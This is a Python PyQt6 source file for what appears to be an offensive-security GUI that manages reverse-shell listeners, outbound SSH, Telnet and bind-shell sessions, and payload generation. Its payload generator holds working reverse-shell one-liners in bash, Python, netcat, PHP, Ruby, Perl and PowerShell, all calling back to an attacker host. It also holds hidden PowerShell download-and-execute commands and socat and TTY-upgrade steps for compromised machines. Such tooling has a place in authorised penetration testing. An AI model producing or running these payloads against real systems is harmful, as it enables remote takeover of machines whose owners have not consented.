# app/widgets/shell_management_widget.py
import os
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QTabWidget, 
                            QTextEdit, QLineEdit, QPushButton, QLabel, QComboBox,
                            QSpinBox, QTableWidget, QTableWidgetItem, QSplitter,
                            QGroupBox, QFormLayout, QCheckBox, QProgressBar,
                            QMessageBox, QFileDialog, QScrollArea)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal
from PyQt6.QtGui import QFont, QTextCursor, QColor, QPalette
from app.core.shell_manager import shell_manager
from app.core.listener_manager import listener_manager
from app.core.logger import logger
from app.widgets.terminal_window import TerminalWindow, SystemTerminalWindow

# ShellTerminalWidget removed - replaced with TerminalWindow

class ShellListenerWidget(QWidget):
    """Widget for managing shell listeners"""
    
    listener_created = pyqtSignal(str, int, str)  # listener_id, port, shell_type
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setup_ui()
        self.connect_signals()
        
        # Update timer
        self.update_timer = QTimer()
        self.update_timer.timeout.connect(self.update_listeners_table)
        self.update_timer.start(2000)
        
    def setup_ui(self):
        layout = QVBoxLayout(self)
        
        # Listener configuration
        config_group = QGroupBox("Create Reverse Shell Listener")
        config_layout = QFormLayout(config_group)
        
        self.port_spin = QSpinBox()
        self.port_spin.setRange(1, 65535)
        self.port_spin.setValue(4444)
        config_layout.addRow("Port:", self.port_spin)
        
        self.shell_type_combo = QComboBox()
        self.shell_type_combo.addItems(["netcat", "http_oob", "dns_oob", "powershell"])
        config_layout.addRow("Listener Type:", self.shell_type_combo)
        
        self.bind_ip_input = QLineEdit("0.0.0.0")
        config_layout.addRow("Bind IP:", self.bind_ip_input)
        
        create_btn = QPushButton("Create Listener")
        create_btn.clicked.connect(self.create_listener)
        config_layout.addRow(create_btn)
        
        # Open listener terminal button
        open_terminal_btn = QPushButton("Open Listener Terminal")
        open_terminal_btn.clicked.connect(self.open_listener_terminal)
        config_layout.addRow(open_terminal_btn)
        
        layout.addWidget(config_group)
        
        # Active listeners table
        listeners_group = QGroupBox("Active Listeners")
        listeners_layout = QVBoxLayout(listeners_group)
        
        self.listeners_table = QTableWidget()
        self.listeners_table.setColumnCount(6)
        self.listeners_table.setHorizontalHeaderLabels(["ID", "Port", "Type", "Status", "Connections", "Actions"])
        listeners_layout.addWidget(self.listeners_table)
        
        layout.addWidget(listeners_group)
        
        # Captured data
        data_group = QGroupBox("Captured Data")
        data_layout = QVBoxLayout(data_group)
        
        self.data_output = QTextEdit()
        self.data_output.setReadOnly(True)
        self.data_output.setFont(QFont("Consolas", 10))
        self.data_output.setMaximumHeight(200)
        data_layout.addWidget(self.data_output)
        
        clear_data_btn = QPushButton("Clear Data")
        clear_data_btn.clicked.connect(self.clear_captured_data)
        data_layout.addWidget(clear_data_btn)
        
        layout.addWidget(data_group)
        
    def connect_signals(self):
        """Connect listener manager signals"""
        listener_manager.listener_started.connect(self.on_listener_started)
        listener_manager.listener_stopped.connect(self.on_listener_stopped)
        listener_manager.connection_received.connect(self.on_connection_received)
        listener_manager.oob_data_received.connect(self.on_oob_data_received)
        
    def create_listener(self):
        """Create new reverse shell listener"""
        port = self.port_spin.value()
        shell_type = self.shell_type_combo.currentText()
        bind_ip = self.bind_ip_input.text().strip()
        
        try:
            listener_id = listener_manager.create_listener(port, shell_type, bind_ip)
            success = listener_manager.start_listener(listener_id)
            
            if success:
                self.listener_created.emit(listener_id, port, shell_type)
                QMessageBox.information(self, "Listener Created", 
                                      f"Listener {listener_id} started on port {port}")
            else:
                QMessageBox.critical(self, "Error", "Failed to start listener")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to create listener: {str(e)}")
            
    def update_listeners_table(self):
        """Update the listeners table"""
        listeners = listener_manager.get_all_listeners()
        self.listeners_table.setRowCount(len(listeners))
        
        for row, listener in enumerate(listeners):
            self.listeners_table.setItem(row, 0, QTableWidgetItem(listener['id']))
            self.listeners_table.setItem(row, 1, QTableWidgetItem(str(listener['port'])))
            self.listeners_table.setItem(row, 2, QTableWidgetItem(listener['type']))
            self.listeners_table.setItem(row, 3, QTableWidgetItem(listener['status']))
            self.listeners_table.setItem(row, 4, QTableWidgetItem(str(len(listener['connections']))))
            
            # Actions button
            if listener['status'] == 'running':
                stop_btn = QPushButton("Stop")
                stop_btn.clicked.connect(lambda checked, lid=listener['id']: self.stop_listener(lid))
                self.listeners_table.setCellWidget(row, 5, stop_btn)
            else:
                start_btn = QPushButton("Start")
                start_btn.clicked.connect(lambda checked, lid=listener['id']: self.start_listener(lid))
                self.listeners_table.setCellWidget(row, 5, start_btn)
    
    def stop_listener(self, listener_id: str):
        """Stop a listener"""
        listener_manager.stop_listener(listener_id)
        
    def start_listener(self, listener_id: str):
        """Start a listener"""
        listener_manager.start_listener(listener_id)
        
    def on_listener_started(self, listener_id: str, port: int, listener_type: str):
        """Handle listener started event"""
        self.data_output.append(f"[{listener_id}] Listener started on port {port} ({listener_type})")
        
    def on_listener_stopped(self, listener_id: str):
        """Handle listener stopped event"""
        self.data_output.append(f"[{listener_id}] Listener stopped")
        
    def on_connection_received(self, listener_id: str, client_ip: str, data: str):
        """Handle connection received event"""
        self.data_output.append(f"[{listener_id}] Connection from {client_ip}: {data}")
        
    def on_oob_data_received(self, listener_id: str, source_ip: str, data: str):
        """Handle OOB data received event"""
        self.data_output.append(f"[{listener_id}] OOB Data from {source_ip}: {data}")
        
    def clear_captured_data(self):
        """Clear captured data display"""
        self.data_output.clear()
        
    def get_active_listeners(self):
        """Get list of active listeners for dropdown"""
        return [(l['id'], f"{l['id']} (Port {l['port']}, {l['type']})") 
                for l in listener_manager.get_active_listeners()]
                
    def open_listener_terminal(self):
        """Open terminal window for selected listener"""
        current_row = self.listeners_table.currentRow()
        if current_row < 0:
            QMessageBox.warning(self, "Warning", "Please select a listener first")
            return
            
        listener_id = self.listeners_table.item(current_row, 0).text()
        
        # Get parent widget to access terminal windows
        parent_widget = self.parent()
        while parent_widget and not hasattr(parent_widget, 'active_terminal_windows'):
            parent_widget = parent_widget.parent()
            
        if parent_widget:
            if listener_id not in parent_widget.active_terminal_windows:
                # Create new listener terminal window
                terminal_window = TerminalWindow(listener_id=listener_id)
                terminal_window.window_closed.connect(parent_widget.on_terminal_window_closed)
                terminal_window.show()
                
                parent_widget.active_terminal_windows[listener_id] = terminal_window
                parent_widget.update_terminal_windows_table()
                
                if hasattr(parent_widget, 'status_updated'):
                    parent_widget.status_updated.emit(f"Listener terminal opened: {listener_id}")
            else:
                # Bring existing window to front
                parent_widget.active_terminal_windows[listener_id].raise_()
                parent_widget.active_terminal_windows[listener_id].activateWindow()

class ShellPayloadWidget(QWidget):
    """Widget for generating shell payloads"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setup_ui()
        
    def setup_ui(self):
        layout = QVBoxLayout(self)
        
        # Payload configuration
        config_group = QGroupBox("Payload Generator")
        config_layout = QFormLayout(config_group)
        
        self.lhost_input = QLineEdit()
        self.lhost_input.setPlaceholderText("Attacker IP (e.g., 192.168.1.100)")
        config_layout.addRow("LHOST:", self.lhost_input)
        
        self.lport_spin = QSpinBox()
        self.lport_spin.setRange(1, 65535)
        self.lport_spin.setValue(4444)
        config_layout.addRow("LPORT:", self.lport_spin)
        
        self.payload_type_combo = QComboBox()
        self.payload_type_combo.addItems([
            "bash", "bash_url_encoded", "python", "python3", "nc", "nc_mkfifo", 
            "php", "php_oneliner", "ruby", "perl", "powershell", "powershell_base64",
            "powercat", "cmd_injection", "msfvenom_windows", "tty_escape"
        ])
        config_layout.addRow("Payload Type:", self.payload_type_combo)
        
        generate_btn = QPushButton("Generate Payload")
        generate_btn.clicked.connect(self.generate_payload)
        config_layout.addRow(generate_btn)
        
        layout.addWidget(config_group)
        
        # Generated payload
        payload_group = QGroupBox("Generated Payload")
        payload_layout = QVBoxLayout(payload_group)
        
        self.payload_output = QTextEdit()
        self.payload_output.setReadOnly(True)
        self.payload_output.setFont(QFont("Consolas", 10))
        payload_layout.addWidget(self.payload_output)
        
        # Payload actions
        actions_layout = QHBoxLayout()
        
        copy_btn = QPushButton("Copy to Clipboard")
        copy_btn.clicked.connect(self.copy_payload)
        actions_layout.addWidget(copy_btn)
        
        save_btn = QPushButton("Save to File")
        save_btn.clicked.connect(self.save_payload)
        actions_layout.addWidget(save_btn)
        
        payload_layout.addLayout(actions_layout)
        layout.addWidget(payload_group)
        
        # Shell upgrade commands
        upgrade_group = QGroupBox("Shell Upgrade Commands")
        upgrade_layout = QVBoxLayout(upgrade_group)
        
        self.upgrade_combo = QComboBox()
        self.upgrade_combo.addItems(["python_pty", "python3_pty", "script_pty", "socat_upgrade", "full_tty_upgrade"])
        self.upgrade_combo.currentTextChanged.connect(self.show_upgrade_commands)
        upgrade_layout.addWidget(self.upgrade_combo)
        
        self.upgrade_output = QTextEdit()
        self.upgrade_output.setReadOnly(True)
        self.upgrade_output.setFont(QFont("Consolas", 10))
        upgrade_layout.addWidget(self.upgrade_output)
        
        layout.addWidget(upgrade_group)
        
        # Show initial upgrade commands
        self.show_upgrade_commands()
        
    def generate_payload(self):
        """Generate reverse shell payload"""
        lhost = self.lhost_input.text().strip()
        lport = self.lport_spin.value()
        payload_type = self.payload_type_combo.currentText()
        
        if not lhost:
            QMessageBox.warning(self, "Warning", "Please enter LHOST")
            return
            
        payload = self.get_reverse_shell_payload(payload_type, lhost, lport)
        self.payload_output.setText(payload)
        
    def get_reverse_shell_payload(self, payload_type: str, lhost: str, lport: int) -> str:
        """Get reverse shell payload based on type"""
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "bash_url_encoded": f"bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{lhost}%2F{lport}%200%3E%261%22",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
            "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
            "nc": f"nc -e /bin/sh {lhost} {lport}",
            "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "php_oneliner": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
            "powershell": f"powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            "powershell_base64": self.get_powershell_base64_payload(lhost, lport),
            "powercat": f"IEX (New-Object System.Net.Webclient).DownloadString (\"http://{lhost}/powercat.ps1\");\npowercat -c {lhost} -p {lport} -e powershell",
            "cmd_injection": f'for /f "delims=" %i in (\'dir 2^>^&1 *^|echo powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString(\'http://{lhost}/payload.ps1\')"\') do @%i',
            "msfvenom_windows": f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f python -b '\\x00'",
            "tty_escape": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
        }
        
        return payloads.get(payload_type, "Unknown payload type")
        
    def get_powershell_base64_payload(self, lhost: str, lport: int) -> str:
        """Generate base64 encoded PowerShell payload"""
        ps_cmd = f"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/shell.ps1')"
        return f"""# Base64 encode this PowerShell command:
# {ps_cmd}
# Use this in PowerShell to encode:
$cmd = "{ps_cmd}"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
[Convert]::ToBase64String($bytes)

# Then use: powershell -nop -w hidden -enc <BASE64_STRING>"""
        
    def copy_payload(self):
        """Copy payload to clipboard"""
        from PyQt6.QtWidgets import QApplication
        clipboard = QApplication.clipboard()
        clipboard.setText(self.payload_output.toPlainText())
        
    def save_payload(self):
        """Save payload to file"""
        payload = self.payload_output.toPlainText()
        if not payload:
            return
            
        filename, _ = QFileDialog.getSaveFileName(
            self, "Save Payload", "", "Text Files (*.txt);;All Files (*)"
        )
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write(payload)
                QMessageBox.information(self, "Success", "Payload saved successfully")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to save payload: {str(e)}")
                
    def show_upgrade_commands(self):
        """Show shell upgrade commands"""
        upgrade_type = self.upgrade_combo.currentText()
        commands = self.get_shell_upgrade_commands().get(upgrade_type, [])
        self.upgrade_output.setText("\n".join(commands))
        
    def get_shell_upgrade_commands(self) -> dict:
        """Get shell upgrade commands"""
        return {
            "python_pty": [
                "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
                "# Press Ctrl+Z to background",
                "stty raw -echo",
                "fg",
                "export TERM=xterm"
            ],
            "python3_pty": [
                "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                "# Press Ctrl+Z to background", 
                "stty raw -echo",
                "fg",
                "export TERM=xterm"
            ],
            "script_pty": [
                "script -qc /bin/bash /dev/null",
                "# Press Ctrl+Z to background",
                "stty raw -echo",
                "fg",
                "export TERM=xterm"
            ],
            "socat_upgrade": [
                "# On attacker machine:",
                "socat file:`tty`,raw,echo=0 tcp-listen:4444",
                "# On victim machine:",
                "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444"
            ],
            "full_tty_upgrade": [
                "# Step 1: Spawn TTY",
                "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                "# Step 2: Background the shell (Ctrl+Z)",
                "# Step 3: Configure terminal",
                "stty raw -echo",
                "# Step 4: Foreground the shell",
                "fg",
                "# Step 5: Set environment",
                "export SHELL=/bin/bash",
                "export TERM=screen",
                "stty rows 38 columns 116",
                "reset"
            ]
        }

class ShellManagementWidget(QWidget):
    """Main shell management widget with new layout"""
    
    status_updated = pyqtSignal(str)
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setup_ui()
        self.connect_signals()
        self.update_timer = QTimer()
        self.update_timer.timeout.connect(self.update_tables)
        self.update_timer.start(2000)
        
    def update_tables(self):
        """Update all tables"""
        self.update_sessions_table()
        self.update_listeners_table()
        
    def setup_ui(self):
        layout = QVBoxLayout(self)
        
        # Main horizontal splitter
        main_splitter = QSplitter(Qt.Orientation.Horizontal)
        
        # Left panel - Sessions and Listeners
        left_panel = self.build_left_panel()
        main_splitter.addWidget(left_panel)
        
        # Right panel - Terminal workspace and utilities
        right_panel = self.build_right_panel()
        main_splitter.addWidget(right_panel)
        
        # Set splitter proportions (left ~20%, right ~80%)
        main_splitter.setSizes([200, 800])
        main_splitter.setStretchFactor(0, 1)
        main_splitter.setStretchFactor(1, 4)
        
        layout.addWidget(main_splitter)
        
    def build_left_panel(self):
        """Build left sidebar with utility tabs and session/listener tables"""
        left_panel = QWidget()
        left_panel.setMaximumWidth(480)
        left_layout = QVBoxLayout(left_panel)
        
        # Utility tabs at top
        self.utility_tabs = QTabWidget()
        self.utility_tabs.addTab(self.build_listener_tab(), "Create Listener")
        self.utility_tabs.addTab(self.build_payload_tab(), "Payloads")
        self.utility_tabs.addTab(self.build_connect_tab(), "Connect")
        self.utility_tabs.currentChanged.connect(self.on_utility_tab_changed)
        left_layout.addWidget(self.utility_tabs)
        
        # Active Sessions
        sessions_label = QLabel("Active Sessions")
        sessions_label.setStyleSheet("font-weight: bold; font-size: 12px;")
        left_layout.addWidget(sessions_label)
        
        self.sessions_table = QTableWidget()
        self.sessions_table.setColumnCount(3)
        self.sessions_table.setHorizontalHeaderLabels(["ID", "Target", "Status"])
        self.sessions_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.sessions_table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        self.sessions_table.itemDoubleClicked.connect(self.open_session_terminal)
        left_layout.addWidget(self.sessions_table)
        
        # Active Listeners
        listeners_label = QLabel("Active Listeners")
        listeners_label.setStyleSheet("font-weight: bold; font-size: 12px;")
        left_layout.addWidget(listeners_label)
        
        self.listeners_table = QTableWidget()
        self.listeners_table.setColumnCount(4)
        self.listeners_table.setHorizontalHeaderLabels(["ID", "Port", "Bind IP", "Type"])
        self.listeners_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.listeners_table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        self.listeners_table.itemDoubleClicked.connect(self.open_listener_terminal)
        left_layout.addWidget(self.listeners_table)
        
        return left_panel
        
    def build_right_panel(self):
        """Build right panel with terminal workspace only"""
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        
        # Terminal workspace
        self.terminal_tabs = QTabWidget()
        self.terminal_tabs.setTabsClosable(True)
        self.terminal_tabs.tabCloseRequested.connect(self.close_terminal_tab)
        right_layout.addWidget(self.terminal_tabs)
        
        return right_panel

        
    def connect_signals(self):
        """Connect shell manager signals"""
        shell_manager.session_established.connect(self.add_session)
        shell_manager.session_terminated.connect(self.remove_session)
        listener_manager.listener_started.connect(self.add_listener)
        listener_manager.listener_stopped.connect(self.remove_listener)
        
    def build_connect_tab(self):
        """Build outbound connection utility tab"""
        widget = QWidget()
        layout = QFormLayout(widget)
        
        self.conn_type_combo = QComboBox()
        from app.core.shell_manager import TELNET_AVAILABLE
        items = ["SSH", "Bind Shell"]
        if TELNET_AVAILABLE:
            items.insert(1, "Telnet")
        self.conn_type_combo.addItems(items)
        layout.addRow("Type:", self.conn_type_combo)
        
        self.host_input = QLineEdit()
        self.host_input.setPlaceholderText("Target IP/hostname")
        layout.addRow("Host:", self.host_input)
        
        self.port_input = QSpinBox()
        self.port_input.setRange(1, 65535)
        self.port_input.setValue(22)
        layout.addRow("Port:", self.port_input)
        
        self.username_input = QLineEdit()
        self.username_input.setPlaceholderText("Username (SSH only)")
        layout.addRow("Username:", self.username_input)
        
        self.password_input = QLineEdit()
        self.password_input.setEchoMode(QLineEdit.EchoMode.Password)
        self.password_input.setPlaceholderText("Password (SSH only)")
        layout.addRow("Password:", self.password_input)
        
        connect_btn = QPushButton("Connect")
        connect_btn.clicked.connect(self.create_outbound_connection)
        layout.addRow(connect_btn)
        
        return widget
        

    def build_payload_tab(self):
        """Build payload generation utility tab"""
        return ShellPayloadWidget()
        
    def build_listener_tab(self):
        """Build listener creation utility tab"""
        widget = QWidget()
        layout = QFormLayout(widget)
        
        self.port_spin = QSpinBox()
        self.port_spin.setRange(1, 65535)
        self.port_spin.setValue(4444)
        layout.addRow("Port:", self.port_spin)
        
        self.shell_type_combo = QComboBox()
        self.shell_type_combo.addItems(["netcat", "http", "dns_oob", "powershell"])
        layout.addRow("Listener Type:", self.shell_type_combo)
        
        self.bind_ip_input = QLineEdit("0.0.0.0")
        layout.addRow("Bind IP:", self.bind_ip_input)
        
        create_btn = QPushButton("Create Listener")
        create_btn.clicked.connect(self.create_listener)
        layout.addRow(create_btn)
        
        return widget
    
    def create_listener(self):
        """Create new reverse shell listener"""
        port = self.port_spin.value()
        shell_type = self.shell_type_combo.currentText()
        bind_ip = self.bind_ip_input.text().strip()
        
        try:
            listener_id = listener_manager.create_listener(port, shell_type, bind_ip)
            success = listener_manager.start_listener(listener_id)
            
            if success:
                self.status_updated.emit(f"Listener {listener_id} started on {bind_ip}:{port}")
            else:
                QMessageBox.critical(self, "Error", "Failed to start listener")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to create listener: {str(e)}")
    
    def open_terminal_tab(self, title: str, session_id: str = None, listener_id: str = None):
        """Open new terminal tab in embedded workspace"""
        # Create embedded terminal
        if session_id:
            terminal = TerminalWindow(session_id=session_id)
        elif listener_id:
            terminal = TerminalWindow(listener_id=listener_id)
        else:
            terminal = SystemTerminalWindow()
            
        # Add tab
        tab_index = self.terminal_tabs.addTab(terminal, title)
        self.terminal_tabs.setCurrentIndex(tab_index)
        
        return terminal
        
    def close_terminal_tab(self, index: int):
        """Close terminal tab"""
        self.terminal_tabs.removeTab(index)
            
    def add_session(self, session_id: str, session_info: dict):
        """Add session to table"""
        self.update_sessions_table()
        self.status_updated.emit(f"Session established: {session_id}")
        
    def remove_session(self, session_id: str, reason: str):
        """Remove session from table"""
        self.update_sessions_table()
        self.status_updated.emit(f"Session terminated: {session_id} ({reason})")
        
    def add_listener(self, listener_id: str, port: int, listener_type: str):
        """Add listener to table"""
        self.update_listeners_table()
        self.status_updated.emit(f"Listener started: {listener_id}")
        
    def remove_listener(self, listener_id: str):
        """Remove listener from table"""
        self.update_listeners_table()
        self.status_updated.emit(f"Listener stopped: {listener_id}")
            
    def update_sessions_table(self):
        """Update sessions table"""
        sessions = shell_manager.get_active_sessions()
        self.sessions_table.setRowCount(len(sessions))
        
        for row, session in enumerate(sessions):
            self.sessions_table.setItem(row, 0, QTableWidgetItem(session['session_id']))
            self.sessions_table.setItem(row, 1, QTableWidgetItem(session['target']))
            self.sessions_table.setItem(row, 2, QTableWidgetItem(session['status']))
            
    def update_listeners_table(self):
        """Update listeners table"""
        listeners = listener_manager.get_all_listeners()
        self.listeners_table.setRowCount(len(listeners))
        
        for row, listener in enumerate(listeners):
            self.listeners_table.setItem(row, 0, QTableWidgetItem(listener['id']))
            self.listeners_table.setItem(row, 1, QTableWidgetItem(str(listener['port'])))
            self.listeners_table.setItem(row, 2, QTableWidgetItem(listener.get('bind_ip', '0.0.0.0')))
            self.listeners_table.setItem(row, 3, QTableWidgetItem(listener['type']))
            
    def open_session_terminal(self):
        """Open terminal tab for selected session"""
        current_row = self.sessions_table.currentRow()
        if current_row < 0:
            QMessageBox.warning(self, "Warning", "Please select a session first")
            return
            
        session_id = self.sessions_table.item(current_row, 0).text()
        title = f"Session: {session_id}"
        
        # Check if tab already exists
        for i in range(self.terminal_tabs.count()):
            if self.terminal_tabs.tabText(i) == title:
                self.terminal_tabs.setCurrentIndex(i)
                return
                
        self.open_terminal_tab(title, session_id=session_id)
        self.status_updated.emit(f"Terminal opened for session: {session_id}")
        
    def open_listener_terminal(self):
        """Open terminal tab for selected listener"""
        current_row = self.listeners_table.currentRow()
        if current_row < 0:
            QMessageBox.warning(self, "Warning", "Please select a listener first")
            return
            
        listener_id = self.listeners_table.item(current_row, 0).text()
        title = f"Listener: {listener_id}"
        
        # Check if tab already exists
        for i in range(self.terminal_tabs.count()):
            if self.terminal_tabs.tabText(i) == title:
                self.terminal_tabs.setCurrentIndex(i)
                return
                
        self.open_terminal_tab(title, listener_id=listener_id)
        self.status_updated.emit(f"Terminal opened for listener: {listener_id}")
        
    def create_outbound_connection(self):
        """Create new outbound shell connection"""
        conn_type = self.conn_type_combo.currentText()
        host = self.host_input.text().strip()
        port = self.port_input.value()
        
        if not host:
            QMessageBox.warning(self, "Warning", "Please enter host")
            return
            
        try:
            if conn_type == "SSH":
                username = self.username_input.text().strip()
                password = self.password_input.text()
                
                if not username:
                    QMessageBox.warning(self, "Warning", "Please enter username for SSH")
                    return
                    
                session_id = shell_manager.establish_ssh_connection(
                    host, port, username, password
                )
                
            elif conn_type == "Telnet":
                session_id = shell_manager.establish_telnet_connection(host, port)
                
            elif conn_type == "Bind Shell":
                session_id = shell_manager.create_bind_shell(host, port)
                
            # Auto-open terminal tab for new connection
            title = f"Session: {session_id}"
            self.open_terminal_tab(title, session_id=session_id)
            self.status_updated.emit(f"Connection established: {session_id}")
            
        except Exception as e:
            QMessageBox.critical(self, "Connection Error", str(e))
            self.status_updated.emit(f"Connection failed: {str(e)}")
            
    def on_utility_tab_changed(self, index):
        """Handle utility tab changes"""
        pass
                
